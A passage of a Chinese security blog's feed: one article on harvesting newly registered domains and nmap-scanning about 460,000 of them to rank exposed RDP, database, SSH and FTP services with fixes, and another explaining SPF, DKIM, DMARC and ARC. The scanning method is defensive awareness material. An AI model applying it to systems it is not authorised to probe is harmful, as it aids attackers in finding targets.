位址，使用者可在瀏覽器輸入 IP 位址來找到對應的網站。不過 IP 位址是一組不容易記憶的數字。為了讓瀏覽網站更容易，網域的概念便應運而生，簡單一點說就是平常在網址列看到除了 http:// 開頭的那一段(ex. <a href=\"http://google.com\">google.com</a>)。</p>\n<h4 id=\"whois-%3A\"><a class=\"direct-link\" href=\"#whois-%3A\">#</a> Whois :</h4>\n<p>網站在申請網域後，負責管理 Domain與 IP 的註冊商會依照 ICANN(註 1) 的規定將資訊公開在 Whois 資料庫。Whois 是非集中管理式的資料庫，註冊數據保存在不同的位置，並由複數註冊商共同管理，所有人都可以藉由 Whois 查詢到域名的擁有者與聯繫信息，聯繫信息中包括郵寄地址、電話號碼和電子郵件。</p>\n<h3 id=\"%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A\">#</a> 使用方式 :</h3>\n<p>這次我們會用到的是新註冊的網域，在 Whois Data Center 最近 7 天的新註冊網域資料是免費的，任何人都可以下載，包含駭客。<br>\n下載位置 : <a href=\"https://whoisdatacenter.com/free-database\">https://whoisdatacenter.com/free-database</a></p>\n<h3 id=\"2.-nmap\"><a class=\"direct-link\" href=\"#2.-nmap\">#</a> 2. NMAP</h3>\n<p><img src=\"/img/posts/nick/website-go-live-attack/3.jpg\" alt=\"Photo by Arget on Unsplash\"></p>\n<h3 id=\"%E7%B0%A1%E4%BB%8B-%3A-2\"><a class=\"direct-link\" href=\"#%E7%B0%A1%E4%BB%8B-%3A-2\">#</a> 簡介 :</h3>\n<p>NMAP(Network Mapper)是一款開源的網絡探測和安全審核的工具。它的設計目標是快速地掃描大型網路。NMAP的功能非常豐富光介紹就可以寫數篇文章，所以這邊只著重在測試中有用到的功能。</p>\n<h3 id=\"%E5%AE%89%E8%A3%9D%E6%96%B9%E5%BC%8F-%3A\"><a class=\"direct-link\" href=\"#%E5%AE%89%E8%A3%9D%E6%96%B9%E5%BC%8F-%3A\">#</a> 安裝方式 :</h3>\n<p>Linux(Debain) 系統可參考下列命令安裝，Windows 則需從到官網下載安裝檔。</p>\n<pre><code>sudo apt-get install nmap\n</code></pre>\n<h3 id=\"%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A-2\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F-%3A-2\">#</a> 使用方式 :</h3>\n<p>NMAP 預設會掃最常見的 1000 個 Port，T4 與 sS 都是加速掃描的選項。</p>\n<pre><code>nmap -T4 -sS example.com\n</code></pre>\n<h2 id=\"%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\">#</a> 實例分享</h2>\n<p>從 Whois Data Center 收集來一週內新註冊網域來當測試對象，實際上總共找到了約 46 萬個不同的網域，接著用 NMAP 對所有找出來的網域進行 Port Scan，最後從結果中整理出 5 個新網站最常見且有弱點的服務，排名方式以網站數量為準。</p>\n<hr>\n<h3 id=\"no.5-rdp\"><a class=\"direct-link\" href=\"#no.5-rdp\">#</a> NO.5 RDP</h3>\n<h4 id=\"1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-7147(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-1.6%25)%E3%80%82\"><a class=\"direct-link\" href=\"#1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-7147(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-1.6%25)%E3%80%82\">#</a> 1. 網站數量 : 7147(約佔總數 1.6%)。</h4>\n<h4 id=\"2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\"><a class=\"direct-link\" href=\"#2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\">#</a> 2. 服務類型 : 遠端控制。</h4>\n<h4 id=\"3.-%E5%B0%8D%E5%A4%96-port-%3A-3389%E3%80%82\"><a class=\"direct-link\" href=\"#3.-%E5%B0%8D%E5%A4%96-port-%3A-3389%E3%80%82\">#</a> 3. 對外 Port : 3389。</h4>\n<h4 id=\"4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\"><a class=\"direct-link\" href=\"#4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\">#</a> 4. 弱點說明 :</h4>\n<p>RDP(Remote Desktop Protocol) 是 Windows 內建的遠端控制功能，特點之一是會把登入過的使用者帳號顯示出來，這大幅降低了駭客暴力破解難度，用 Windows Server 來架站比較常出現這個問題。</p>\n<hr>\n<h3 id=\"no.4.-postgresql-%3A\"><a class=\"direct-link\" href=\"#no.4.-postgresql-%3A\">#</a> NO.4. PostgreSQL :</h3>\n<h4 id=\"1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-31983-(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-7.0%25)%E3%80%82\"><a class=\"direct-link\" href=\"#1.-%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-31983-(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-7.0%25)%E3%80%82\">#</a> 1. 網站數量 : 31983 (約佔總數 7.0%)。</h4>\n<h4 id=\"2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\"><a class=\"direct-link\" href=\"#2.-%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\">#</a> 2. 服務類型 : 資料庫。</h4>\n<h4 id=\"3.-%E5%B0%8D%E5%A4%96-port-%3A-5432%E3%80%82\"><a class=\"direct-link\" href=\"#3.-%E5%B0%8D%E5%A4%96-port-%3A-5432%E3%80%82\">#</a> 3. 對外 Port : 5432。</h4>\n<h4 id=\"4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\"><a class=\"direct-link\" href=\"#4.-%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\">#</a> 4. 弱點說明 :</h4>\n<p>PostgreSQL 是一個強大的開源資料庫，一般狀況下該資料庫限制只有本地機器才可存取，但有些人為了方便將其對外開放，對外開放就要特別注意暴力破解的風險跟禁用預設帳號。</p>\n<hr>\n<h3 id=\"no-3.-mysql-%3A\"><a class=\"direct-link\" href=\"#no-3.-mysql-%3A\">#</a> No 3. MySQL :</h3>\n<h4 id=\"%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-38458(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-8.3%25)%E3%80%82\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-38458(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-8.3%25)%E3%80%82\">#</a> 網站數量 : 38458(約佔總數 8.3%)。</h4>\n<h4 id=\"%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E8%B3%87%E6%96%99%E5%BA%AB%E3%80%82\">#</a> 服務類型 : 資料庫。</h4>\n<h4 id=\"%E5%B0%8D%E5%A4%96-port-%3A-3306%E3%80%82\"><a class=\"direct-link\" href=\"#%E5%B0%8D%E5%A4%96-port-%3A-3306%E3%80%82\">#</a> 對外 Port : 3306。</h4>\n<h4 id=\"%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\"><a class=\"direct-link\" href=\"#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A\">#</a> 弱點說明 :</h4>\n<p>MySQL 是老牌且有著高市佔率的資料庫，危險的地方在於預設帳號 root 的密碼是空白，資料庫安裝時如果沒有改設定又對外開放，駭客有機會長驅直入。</p>\n<h4 id=\"%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A\">#</a> 修復建議 :</h4>\n<p>資料庫安裝完畢後盡快移除 root 帳號，否則就算沒有使用空密碼也有被暴力破解的風險，另外建議限制 IP 來源，下方範例為更改所有現有的用戶只能從指定 IP 登錄。</p>\n<hr>\n<h3 id=\"no-2.-ssh-%3A\"><a class=\"direct-link\" href=\"#no-2.-ssh-%3A\">#</a> No 2. SSH :</h3>\n<h4 id=\"%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-65041(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-14.1%25)%E3%80%82\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-65041(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-14.1%25)%E3%80%82\">#</a> 網站數量 : 65041(約佔總數 14.1%)。</h4>\n<h4 id=\"%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6%E3%80%82\">#</a> 服務類型 : 遠端控制。</h4>\n<h4 id=\"%E5%B0%8D%E5%A4%96-port-%3A-22%E3%80%82\"><a class=\"direct-link\" href=\"#%E5%B0%8D%E5%A4%96-port-%3A-22%E3%80%82\">#</a> 對外 Port : 22。</h4>\n<h4 id=\"%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\"><a class=\"direct-link\" href=\"#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-2\">#</a> 弱點說明 :</h4>\n<p>SSH 是遠端控制最常見的方法，協議本身安全性很夠，但帳號密碼強度太弱時還是很危險，越常見的功能也越常被駭客盯上。</p>\n<h4 id=\"%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-2\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-2\">#</a> 修復建議 :</h4>\n<p>改用公私鑰登入，駭客偷鑰匙難度比猜密碼難度難上太多了，已經有很多人分享過了，就不重複介紹。</p>\n<hr>\n<h3 id=\"no-1.-ftp-%3A\"><a class=\"direct-link\" href=\"#no-1.-ftp-%3A\">#</a> No 1. FTP :</h3>\n<h4 id=\"%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-77899(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-16.9%25)%E3%80%82\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E7%AB%99%E6%95%B8%E9%87%8F-%3A-77899(%E7%B4%84%E4%BD%94%E7%B8%BD%E6%95%B8-16.9%25)%E3%80%82\">#</a> 網站數量 : 77899(約佔總數 16.9%)。</h4>\n<h4 id=\"%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%9C%8D%E5%8B%99%E9%A1%9E%E5%9E%8B-%3A-%E6%AA%94%E6%A1%88%E5%82%B3%E8%BC%B8%E3%80%82\">#</a> 服務類型 : 檔案傳輸。</h4>\n<h4 id=\"%E5%B0%8D%E5%A4%96-port-%3A-21%E3%80%82\"><a class=\"direct-link\" href=\"#%E5%B0%8D%E5%A4%96-port-%3A-21%E3%80%82\">#</a> 對外 Port : 21。</h4>\n<h4 id=\"%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-3\"><a class=\"direct-link\" href=\"#%E5%BC%B1%E9%BB%9E%E8%AA%AA%E6%98%8E-%3A-3\">#</a> 弱點說明 :</h4>\n<p>FTP 是最常用的檔案傳輸協議，但它本身的安全性不足，不管是傳輸或登入皆使用明碼傳輸，有很高的資料外洩風險，更不用說 FTP 還支援無帳密登入(anyoneuser)，FTP 傳檔雖方便但真的不適合對外開放。</p>\n<h4 id=\"%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-3\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E5%BB%BA%E8%AD%B0-%3A-3\">#</a> 修復建議 :</h4>\n<p>如有對外需求改用 SFTP 或其他有權限控管的檔案傳輸方案，否則盡快關閉對外的 FTP 服務。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>現在越來越多人將網站架在雲上，減少維運成本的同時還可以讓 CSP 業者幫你把關資安問題，但不管怎麼把關也阻止不了你自己開洞給駭客鑽，網站架在雲上用到遠端服務的機會很多，多花一些時間了解該服務並進行安全性設定，這樣才能保證，不管是資安還是品質，我全都要。</p>\n<p>這些問題在成熟的網站上比較少見，因為在網站穩定後大多會關閉這些對外服務，但駭客也知道這個狀況，盯著新建的網站攻擊，想辦法在架站初期植入後門，之後就算網站穩定後關閉對外服務，後門也不會跟著消失。</p>\n<p>這 5 個常見問題不以弱點的嚴重程度來排名是因為其安全性與設定完善程度有關，實際測試的過程中有部分的網站已經有做好安全性設定，駭客實際上是打不進去的，但也有找到部分網站使用預設帳號密碼，甚至是開放無帳密登入，這類網站受到攻擊的機率非常高，如果擔心自己的網站也屬於這一類的話，還未上線的網站可用前面提到的 NMAP 指令在內網進行測試，已上線的網站可以參考前一篇文章用 Shodan 或 FOFA 從外網進快速進行檢測。</p>\n<p>文章連結 : <a href=\"https://medium.com/cymetrics/shodan-fofa-e7e69702923d\">駭客的起手式工具 : Shodan &amp; Fofa</a></p>\n",
      "date_published": "2021-07-23T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/",
      "title": "關於 email security 的大小事 — 延伸篇",
      "content_html": "<!-- summary -->\n<!-- 隨著前幾篇 email security 的介紹，我陸陸續續收到了一些問題，在交流的過程中覺得有一些很重要或是很有趣的討論可以更延伸探討。以下採取 Q&A 的格式，記錄一些討論與延伸知識。 -->\n<!-- summary -->\n<p>隨著前幾篇 email security 的介紹，我陸陸續續收到了一些問題，在交流的過程中覺得有一些很重要或是很有趣的討論可以更延伸探討。<br>\n不過因為原理篇跟設定篇希望可以聚焦在核心觀念上避免主題太發散，所以決定另外開一篇來聊聊這些東西。</p>\n<p>篇幅上會採取 Q&amp;A 的格式，記錄一些討論與延伸知識。若資訊有誤請不吝指正，也歡迎大家提問，讓這一串問答越來越齊全 XDDD</p>\n<p><a href=\"#q1\"><strong>Q1: SPF DKIM DMARC 這些看起來都是 2014 左右才出現的，滿好奇在這之前是怎麼驗證的，還是其實完全沒驗證？</strong></a></p>\n<p><a href=\"#q2\"><strong>Q2: Forwarding 上一篇提到很多次，是什麼意思？跟按信件上面那個箭頭轉發信件一樣嗎？</strong></a></p>\n<p><a href=\"#q3\"><strong>Q3: 『中繼 email server 』也提到很多次耶，他是哪些情況會出現？有可能是任意 domain （就是跟收件者跟寄件者本身都沒什麼關係）嗎？</strong></a></p>\n<p><a href=\"#q4\"><strong>Q4: <code>smtp.MailFrom</code> 跟 <code>header.From</code> 可以不同，然後 alignment 又不過，那 DMARC 不就失敗嗎？</strong></a></p>\n<p><a href=\"#q5\"><strong>Q5: 承上，那之前提到的 ARC 怎麼解這個問題？</strong></a></p>\n<p><a href=\"#q6\"><strong>Q6: 常常看到 SPF 用 <code>~all</code> 而不是 <code>-all</code>，有什麼差？</strong></a></p>\n<p>一樣附上前幾篇的連結，建議看不懂的名詞可以回去參照原理篇：<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a></p>\n<p>設定篇們：<br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a></p>\n<hr>\n<h2 id=\"q1\"><a class=\"direct-link\" href=\"#q1\">#</a> Q1: SPF DKIM DMARC 這些看起來都是 2014 左右才出現的，滿好奇在這之前是怎麼驗證的，還是其實完全沒驗證？</h2>\n<p>SPF 與 DKIM 其實早在 2000 跟 2004 年左右就有在討論了，只是一直沒有訂出標準、更遑論普及，真正受到重視是在 2014 年左右，也是因為這樣才延伸出 DMARC 的。在此之前為了防範釣魚跟垃圾信件，往往都是用黑名單的方式，也就是把已經知道的某些惡意 IP 或是 mail server 列在一個黑名單裡面過濾掉。這跟現在過濾惡意 domain 的方法一樣，都是事後防範（reactive）。</p>\n<hr>\n<h2 id=\"q2\"><a class=\"direct-link\" href=\"#q2\">#</a> Q2: Forwarding 上一篇提到很多次，是什麼意思？跟按信件上面那個箭頭轉發信件一樣嗎？</h2>\n<p>是也不是。</p>\n<p>Forwarding 並不是在 RFC 裡定義明確的一個詞，而是我們用來泛指『轉發』這個動作的用語，負責 forwarding 的 mail server 就稱為 forwarding server 或是 <strong>mediator</strong>（中間人）。</p>\n<p>技術上我會把 forwarding 狹義定義為：在信封袋上（SMTP envelope）更改收信人（<code>smtp.RcptTo</code>）但保留寄件人（<code>smtp.MailFrom</code>）的行為。與 forwarding 相對，連信封袋上的寄件人（<code>smtp.MailFrom</code>）都改寫的行為，就稱為 remailing。舉例來說，假設你有個住在國外且準備回國的朋友，又有個很想買但不外送台灣的精品包包，forwarding 就像是請朋友幫你下訂然後順便帶回來，包裹上寫的還是精品公司的名字；remailing 則是朋友收到包包後用跨國快遞寄回來，包裹上寫的是朋友的名字。</p>\n<p>我們之前提過的 mailing list 就是一種 remailing，它的原理是由一個 mail server 維護一個負責接收信的 reflector 信箱跟訂閱者清單（subscribers），當你想要寄一封信給眾訂閱者時，可以用自己的信箱把信寄到 reflector，這樣就會觸發 mail server 把自己加到 <code>header.Reply-To</code> 跟 <code>smtp.MailFrom</code> ，再自動幫你把原信件轉發給所有訂閱者。有些 marketing email 會這麼做，或是你在一些學術討論串裡也會看到（其實就是 email 版本的聊天室）。這樣做的好處是可以自動化管理訂閱者清單、寄信人不用另外申請新的信箱、而且 mediator 可以視情況修改信件內容，例如在主旨加上標籤或是過濾文字。</p>\n<p>回到主題，根據<a href=\"https://en.wikipedia.org/wiki/Email_forwarding\">維基百科</a>，粗略可以將 forwarding 分成 Server-based forwarding 跟 Client-based forwarding。</p>\n<p>Client-based forwarding ，或稱 resending，又能分成自動和手動，自動的例子是有些會議軟體會允許受邀者修改時間或是會議內容等資訊，然後自動以主辦者的名義再次寄送或更新邀請給所有與會者，此時就會導致 <code>smtp.MailFrom</code> 跟 <code>header.From</code> 不相等。手動的部分就是一般人在 MUA 裡會用到的信件轉發，當我們手動按下轉發箭頭的時候，會把原信件 inline 嵌入到新信件裡，並完整保留附件以及 <code>header.From</code>、<code>header.Reply-To</code> 欄位。上述兩個例子中，其實寄件人（<code>smtp.MailFrom</code>）已經不是原本的寄件人了，所以比起 forwarding 這種行為更接近 remailing。</p>\n<p>那 Server-based forwarding 是什麼呢？許多 mail server 提供一個功能，讓你可以任意創建信箱地址，然後連到你自己本來擁有的信箱，方便信件集中處理。這種情況又被稱作 re-addressing 或 email aliasing，也就是信箱別名，是一種非常常見的應用。</p>\n<p>情境例如：為了讓客戶好辨認，你的公司（<code>candies.com</code>）為不同產品創建了多個客服信箱（<code>cookie@candies.com</code>、<code>chocolate@candies.com</code> 、<code>gummies@candies.com</code>），不過因為公司只有你一個客服，所以所有寄到這些信箱的信件其實都會被導到你的個人信箱，如 <code>jemmy88@gmail.com</code> 或是<code>jemmy01@outlook.com</code> 。 當然，要設定數個別名也行（你有新的客服夥伴一起處理信件啦），總之可以想成是創造一個統一對外的窗口，進來後再分發。早期的 sendmail 就是用一個檔案 <code>~/.forward</code> 來記錄這些一對多的 alias 關係再根據這些規則進行 forwarding。</p>\n<p>或者，你讀大學的時候本來有個學校信箱，畢業之後想繼續維持這個校友地址，但學校並不想負擔信件儲存的成本，這時就能用別名的方式讓信箱地址依然存在，不過信件所有寄到校友信箱的郵件就會被 forward 到你的其他私人信箱。</p>\n<p>不管哪個 aliasing 情境，信件本身（<code>header</code> 跟 <code>body</code>）跟信封袋上的寄件人（<code>smtp.MailFrom</code>）都是不變的。也就是說，收信人看到的內文都是原汁原味，點擊回覆的時候也是回給寄件人而不是中間 forwarding 的 mail server。雖然走過必留痕跡，forwarding 也會在原始信件中的 trace 被記錄下來，但就雙方 end user 溝通的角度而言，中間這層 forwarding 其實是隱形的。</p>\n<hr>\n<h2 id=\"q3\"><a class=\"direct-link\" href=\"#q3\">#</a> Q3:『中繼 email server 』也提到很多次耶，他是哪些情況會出現？有可能是任意 domain （就是跟收件者跟寄件者本身都沒什麼關係）嗎？</h2>\n<p>這個問題的詳細回答可以看看上面的 Q2，『中繼 email server 』是我敘述中比較通俗的用語，指的是寄信方跟最終收信方中間的 hop，在 RFC 定義中較為正式的名字是 <strong>mediator</strong>，也就是中間人。</p>\n<p>mediator 其實不能說是一台 server，而是『提供 reposting 的複合式角色』，它涵蓋了 MTA 的 relay 功能、MUA 的撰寫信件功能、以及 MDA 的地址查詢功能。mediator 也並非是固定的角色，例如一封信從 A 的 mail server 寄到 B 的 mail server，然後 B 再把信轉發到 C mail server，對 A 跟 B 而言這封信沒有經過任何 mediator，但對 C 而言 B 的 mail server 就扮演了 mediator 的角色。</p>\n<p>回到問題，mediator 可以是外部、第三方的服務，所以當然可能是跟收件者寄件者無關的 domain。</p>\n<hr>\n<h2 id=\"q4\"><a class=\"direct-link\" href=\"#q4\">#</a> Q4: <code>smtp.MailFrom</code> 跟 <code>header.From</code> 可以不同，然後 alignment 又不過，那 DMARC 不就失敗嗎？</h2>\n<p>是的！其實 DMARC 會失敗的情況非常多，甚至還出了一個 <a href=\"https://datatracker.ietf.org/doc/html/rfc7960\">RFC7960</a> （Interoperability Issues between Domain-based Message Authentication,<br>\n Reporting, and Conformance (DMARC) and Indirect Email Flows）討論呢！</p>\n<p>Indirect Email Flows 就是間接的寄信方式，包含前面 forwarding 提過的 alias 跟 mailing list，還有很多有趣的案例：</p>\n<ul>\n<li>當 MUA 嘗試以別人的身份寄信：有些新聞或是雜誌網站會有 “forward-to-friend” 功能，或是有些會有 “send-as” 功能。</li>\n<li>有些 IoT 或嵌入式設備會用 hardcoded domain 寄信，或是以 device owner 身份寄信</li>\n<li>有些 MTA 可能會修改信件內文的 encoding 或是 header 的欄位（例如日期格式），造成 DKIM 驗證錯誤</li>\n<li>MDA 也可能會在過濾時使用一些修改信件的功能，例如使用 <code>add_header()</code> 跟 <code>delete_header()</code> 等函式</li>\n</ul>\n<p>以上都是合理應用範圍但是 DMARC 不支援的情境，只要是有經過 mediator 轉達或是有修改到信件內容，要嘛驗證不過要嘛 alignment 不過，幾乎都會讓 DMARC 失敗。尤其大家如果都有好好設置成 <code>p=reject</code> 更是一點轉圜餘地都沒有了。</p>\n<hr>\n<h2 id=\"q5\"><a class=\"direct-link\" href=\"#q5\">#</a> Q5: 承上，那之前提到的 ARC 怎麼解這個問題？</h2>\n<p><strong>ARC（Authenticated Received Chain）</strong> 的宗旨就是為了解決 Indirect Email Flow 的問題，試圖加上更多驗證資訊讓本來準備丟掉 DMARC 失敗的信的 MDA 能重新考慮、通融一下。</p>\n<p>ARC 在 2019 年才成為 RFC 上的文件，仍屬實驗性質（experimental），因此目前有實作與支援的廠商也不多，在我較熟知的範圍裡只有最大的 Gmail 跟 Microsoft Office 365。</p>\n<h3 id=\"%E5%8E%9F%E7%90%86\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E7%90%86\">#</a> 原理</h3>\n<p>回想一下需要 ARC 的最大原因，就是因為經過 mediator 的過程中發生信件的修改更動或是來源不同，所以導致收信方認為自己拿到的『已經不是原本的信件』。但這樣多冤枉呀，信件經過 mediator 之前都是合法的，但最終是否能被收到卻只以收信方的 DMARC 驗證為主，這就像是你從台灣經過日本轉機到美國，美國海關卻打死認為你一定是日本人一樣荒謬啊！</p>\n<p>所以追根究底，只要能夠證明『經過 mediator 前的原始信件』跟『mediator 更動的部分』都是合法的，那就沒有疑慮了吧？</p>\n<p>因此 ARC 的運作方式，就是讓每一個 mediator 在經手信件時對信件做一次 DMARC 驗證，並將驗證結果、先前所有 hop 的 ARC 驗證結果、以及自己做的修改簽名，附在信封袋上作為擔保。每一個擔保的內容都接續著之前經過的 mediator 的擔保，因此會構成一條鏈（Authenticated Received <strong>Chain</strong>），假設鏈上的每個 mediator 都值得信任，那合理推論也可以相信他們所做的 DMARC 驗證結果吧！這樣當最後的終端收信 mail server 自己執行 DMARC 驗證失敗時，就可以透過 ARC 發現『啊，原來原始信件有通過 DMARC，只是中間經過了這些修改所以不一樣了呀』。</p>\n<p>這個『附在信封袋上的擔保』就是 <strong>ARC Set</strong>，是包含下面三個 ARC header 的一組紀錄。</p>\n<ul>\n<li>ARC-Authentication-Results (AAR)：『我做的 DMARC 跟 ARC 驗證』。紀錄此次 DMARC 驗證的結果以及先前每一組 ARC Set 驗證的結果。</li>\n<li>ARC-Message-Signature (AMS)：『我更動的部分並署名』。類似 DKIM Signature 的簽章，內容包含原始信件的各種 header 跟 DKIM Signature，還有新增或是更動的 header。</li>\n<li>ARC-Seal (AS)：『我核可信上所有的 ARC Set 並署名』。類似 DKIM Signature 的簽章，內容包含收到信件時已經紀錄的所有 ARC Set 以及剛剛新加的 AAR 跟 AMS。</li>\n</ul>\n<p>ARC-Seal 的意義是什麼呢？大家可能有經驗，如果去銀行或是公家單位辦事情，在填文件的時候寫錯了，有需要塗改的地方或是新增的備註，會請你在新的資料上蓋自己的印章以茲證明。ARC-Seal 的概念就是在層層印章印上再押上自己的名字，以示『我核可了過去的這一串簽名，當然還有我自己的部分』。</p>\n<h3 id=\"%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B\">#</a> 來個範例</h3>\n<p>下面是一封原始信件的 ARC Set。所有的 header 都是用 stack 的方式紀錄，所以最先加的是紫色的 AAR ，再來是藍色的 AMS，最後是紅色的 AS。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-extra/arc-set.png\" /><figcaption><p>ARC set from <a href=\"http://onedegree.hk\">onedegree.hk</a> to gmail</p>\n</figcaption></figure></p>\n<p>首先可以注意到的是，三個 header 中都由一樣的 <code>i</code> 標籤開始，這是一個類似 nonce、counter、或 ID 的數字，代表是第幾個經過的 mediator，從 1 開始累加。 所以假設我是收到上面這封信的 mediator，我要新增的 ARC Set 就都會標示 <code>i=2</code>。</p>\n<p>再來分別看看各個 header。紫色的 AAR 就是一般的 DMARC 驗證結果，可以看到最後是 <code>pass</code>。藍色的 AMS 幾乎跟 DKIM Signature 一樣，淡藍色的框是新增的 header，最末是原始信件的 DKIM Signature。紅色的 AS 也類似類似 DKIM Signature，但只簽 ARC Set 所以沒有 <code>h</code>、<code>bh</code> 等標籤。</p>\n<p>最重要的是 <code>cv</code> ，代表 <strong>C</strong>hain <strong>V</strong>alidation Status，也就是這條鏈的驗證結果。每一個 mediator 的 <code>cv</code>會根據前一個 mediator 紀錄的 <code>cv</code> 以及各個 ARC Set 的驗證結果決定。當一個 mediator 得出 fail 的結論，他就會停止演算法並標記 <code>cv=fail</code>，且加入的 AS 只會簽署當前新增的 ARC Set，等同打斷這條鏈並將發生錯誤的 ARC Set 視為唯一一組 ARC Set。此後的 mediator 一看到 <code>cv=fail</code> 就會停下不做任何驗證，也不會新增 ARC Set。</p>\n<p>因為圖中是第一個 mediator（<code>i=1</code>）所以 <code>cv=none</code>，畢竟鏈正要開始當然沒有東西可以做 Validation。 另外這裡沒有標示，但是後續的 AAR 會有一個 <code>arc=</code> 的標籤，會根據先前每個 ARC Set 中的 AMS 跟 AS 做驗證，確保鏈的完整性沒有被破壞。</p>\n<p>例如下圖（取自 RFC ）就是經過三個 mediator 的情況，只看螢光字的 <code>arc=</code>，你會發現 <code>i=2</code> 的 mediator 驗證了 <code>i=1</code> 的 AMS 跟 AS，然後 <code>i=3</code> 的 mediator 驗證了 <code>i=1,2</code> 的 AMS 跟 AS。</p>\n<p>你可能會疑問，為什麼在 <code>i=3</code> 的 mediator 那裡有一個 <code>fail</code> 還是得出 <code>arc=pass</code> 的結論呢？</p>\n<p>因為 <code>i=2</code> 的 mediator 對信件進行了修改，所以到 <code>i=3</code> 的 mediator 這裡時信件的 hash 已經不符合 <code>ams.1</code> 解密後的結果了。但是因為符合 <code>ams.2</code>，所以可以推論信件除了 <code>i=2</code> 的 mediator 之外沒有被其他人動過。既然前一個 <code>ams.2</code> 跟所有的 <code>as</code> 都過了，這條鏈是沒有問題的，給 <code>cv=pass</code>！</p>\n<pre class=\"language-text\"><code class=\"language-text\"><span class=\"highlight-line\">ARC-Seal: i=3; 